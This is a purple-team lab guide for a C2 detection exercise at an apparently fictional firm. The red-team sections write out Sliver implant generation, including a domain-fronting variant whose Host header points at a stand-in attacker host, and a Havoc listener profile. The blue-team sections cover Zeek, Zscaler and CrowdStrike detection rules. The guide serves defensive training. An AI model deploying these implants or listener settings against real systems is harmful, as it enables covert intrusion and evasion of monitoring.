# Day 20 — LAB.md
## Purple Team C2 Detection Exercise Lab Setup
**NovaCrest Capital Group | Purple Team Week**

---

## Architecture

```
[Red Team Operator] ──── AWS VPS (198.51.100.99) ──── Sliver C2 Teamserver
                                    │
                           HTTPS C2 channel
                                    │
[LAB-WIN-01] ───── Zscaler Proxy ──── Internet
     │
[CrowdStrike Falcon Agent installed]
     │
[Zeek sensor on SPAN port]──── Zeek logs ──── SIEM
```

---

## Red Team Setup: Sliver C2

```bash
# Install Sliver (on attacker VPS — lab only)
# Sliver is an open-source C2 framework by BishopFox
# https://github.com/BishopFox/sliver

curl https://sliver.sh/install | sudo bash

# Start Sliver teamserver (background)
sudo sliver-server &

# In Sliver console: generate HTTPS implant for Variant 1
sliver > generate --http 198.51.100.99:443 \
                  --os windows \
                  --arch amd64 \
                  --format shellcode \
                  --name variant1_baseline \
                  --seconds 60 \
                  --jitter 0

# Generate Variant 2 (jitter + alternate domain)
sliver > generate --http 198.51.100.50:443 \
                  --os windows \
                  --arch amd64 \
                  --name variant2_jitter \
                  --seconds 300 \
                  --jitter 50 \
                  --http-header "Host: cdn-assets.azureedge-novacrest.com"

# Generate Variant 3 (domain fronting)
sliver > generate --http legitimate-corp.azureedge.net:443 \
                  --os windows \
                  --arch amd64 \
                  --name variant3_fronting \
                  --seconds 600 \
                  --jitter 30 \
                  --http-header "Host: evil-c2.attacker.com"

# Start HTTPS listener
sliver > https --lport 443 --domain novacrest-updates.com

# Verify sessions
sliver > sessions
```

---

## Red Team Setup: Havoc C2 (Variant 4)

```bash
# Install Havoc (on separate attacker VPS — lab only)
# https://github.com/HavocFramework/Havoc
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc && make ts-build

# Configure Havoc teamserver (profiles/default.yaotl)
# Set HTTPS listener with DoH fallback configuration
cat > profiles/novacrest-lab.yaotl << 'EOF'
Teamserver {
    Host = "0.0.0.0"
    Port = 40056
}

Operators {
    user "redteam" {
        Password = "[REDACTED]"
    }
}

Listeners {
    Http {
        Name         = "HTTPS Listener"
        Hosts        = ["198.51.100.50"]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        PortBind     = 443
        PortConn     = 443
        Secure       = true
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        Uris         = ["/fonts/", "/assets/", "/static/", "/api/v1/"]
        Headers      = ["Content-Type: application/octet-stream"]
        Proxy {
            # DoH fallback
            Host     = "1.1.1.1"
            Port     = 443
            Proto    = "https"
        }
        Sleep  = 900
        Jitter = 25
    }
}
EOF

./havoc server --profile profiles/novacrest-lab.yaotl
```

---

## Blue Team Setup: Zeek Configuration

```bash
# Install Zeek (see Day 18 LAB.md for full install)
# Additional packages for C2 detection:

# Install zeek-beacon-detector
zkg install corelight/zeek-beacon-detection

# Install JA3/JARM fingerprinting
zkg install salesforce/ja3
zkg install salesforce/jarm

# Add to local.zeek:
cat >> /opt/zeek/share/zeek/site/local.zeek << 'EOF'
@load packages/ja3
@load packages/jarm
@load packages/zeek-beacon-detection

# Configure beacon detection sensitivity
redef BeaconDetection::beacon_threshold = 5;   # 5+ connections = analyze
redef BeaconDetection::min_variance = 0.05;    # 5% variance tolerance
redef BeaconDetection::max_variance = 0.30;    # 30% max variance to flag

# Log domain fronting (Host ≠ SNI in HTTP)
redef HTTP::default_capture_password = F;
EOF

sudo zeekctl deploy
```

---

## Blue Team: Zscaler Policy Configuration

```
# In Zscaler Internet Access Admin Portal:

1. URL Filtering Policy → Add Rule:
   Name: "New/Uncategorized Domain Alert"
   Category: Newly Registered Domains, Miscellaneous/Unknown
   Action: Alert + Log (not block — observe only for exercise)
   Apply to: ALL users

2. SSL Inspection → Enable for:
   Categories: Newly Registered Domains
   This enables Host header inspection → catches domain fronting

3. Advanced Threat Protection:
   Enable: C2/Botnets category detection
   Enable: Cryptomining (covers some C2 patterns)

4. DNS Security:
   Block: DNS-over-HTTPS to external resolvers
   Allow: Internal DNS only (*.novacrest.com resolvers)
   This blocks Variant 4 DoH fallback

5. Cloud Application Control:
   Alert on: Access to unknown/unmanaged cloud applications
   This flags CDN fronting destinations not in corporate catalog
```

---

## Blue Team: CrowdStrike Custom IOA Rules

```
# In CrowdStrike Falcon console → Endpoint Security → Custom IOA

# Rule 1: Process with network connection to new domain + low prevalence
Rule Name: "C2 Beacon Pattern — Low Prevalence Domain"
Trigger: process → network_connect
  AND connection_count > 5 (within 10 min)
  AND domain_age < 30 days
  AND domain_prevalence < 100 (seen on <100 hosts globally)
Severity: High

# Rule 2: Consistent periodic connection interval (beacon timing)
Rule Name: "Periodic Network Beacon — Timing Anomaly"
Trigger: network_connect
  AND same_destination_ip
  AND connection_interval_coefficient_variation < 0.25
  AND connection_count > 8
Severity: High

# Rule 3: Sliver/Havoc implant memory signatures
Rule Name: "Known C2 Framework Memory Indicator"
Trigger: process_memory_scan
  AND signature MATCHES sliver_implant_pattern OR havoc_implant_pattern
Severity: Critical
```

---

## Exercise Execution Guide

```
PRE-EXERCISE (T-30 minutes)
  □ Red team: verify Sliver teamserver online
  □ Blue team: verify Zscaler, CrowdStrike, Zeek all healthy
  □ Confirm SIEM receiving logs from all three layers
  □ Set exercise clock to T+0:00

VARIANT 1 DEPLOYMENT (T+0:00)
  □ Red team: execute variant1_baseline.exe on LAB-WIN-01
  □ Red team: document deployment timestamp
  □ Blue team: start monitoring — SLA clock starts
  □ Expected detection: < 5 minutes

VARIANT 2 DEPLOYMENT (T+0:30)
  □ Red team: execute variant2_jitter.exe
  □ Terminate variant1 before deploying variant2
  □ Blue team: SLA clock restarts for this variant

VARIANT 3 DEPLOYMENT (T+1:15)
  □ Red team: execute variant3_fronting.exe
  □ Blue team: SLA clock restarts

VARIANT 4 DEPLOYMENT (T+2:00)
  □ Red team: execute variant4_doh.exe (Havoc)
  □ Blue team: SLA clock restarts

EXERCISE CLOSE (T+3:00)
  □ Red team: terminate all beacons
  □ Both teams: compare detection timestamps
  □ Calculate SLA scores
  □ Begin Sigma rule writing workshop

POST-EXERCISE (T+3:00 → T+4:00)
  □ Document missed detections: what would have caught it?
  □ Write Sigma rules for each gap
  □ Build detection tuning roadmap
```

---

## Generating Simulated Data (Demo Mode)

```bash
# Run beacon simulator (no live C2 required)
python3 scripts/c2_beacon_simulator.py --variants all --demo --verbose

# Analyze beacon timing in simulated conn.log
python3 scripts/beacon_timing_analyzer.py --demo --verbose

# Verify Sigma rules against simulated data
sigma check rules/sigma_c2_detection.yml
```

---

*Day 20 Lab Guide | Purple Team C2 Detection Exercise*
*NovaCrest Capital Group | V. Willis, CISSP*
*github.com/Blaakpearl/Blaakpearl*
